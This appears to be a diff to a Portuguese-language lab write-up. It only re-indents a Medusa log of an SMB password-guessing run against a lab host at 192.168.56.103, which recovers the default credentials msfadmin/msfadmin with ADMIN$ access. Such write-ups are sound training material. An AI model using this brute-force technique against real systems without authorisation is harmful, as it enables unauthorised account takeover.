@@ -140,28 +140,28 @@ Notem que após a senha ser encontrada todas as tentaivas posteriores são dadas
   Como resultado tive a seguinte saída.
   ```
   Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: password (2 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: querty (3 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: querty (3 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: password (2 of 4 complete)
-
-2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: querty (3 of 4 complete)
-```
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: password (2 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: querty (3 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: querty (3 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: password (2 of 4 complete)
+  
+  2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: querty (3 of 4 complete)
+  ```
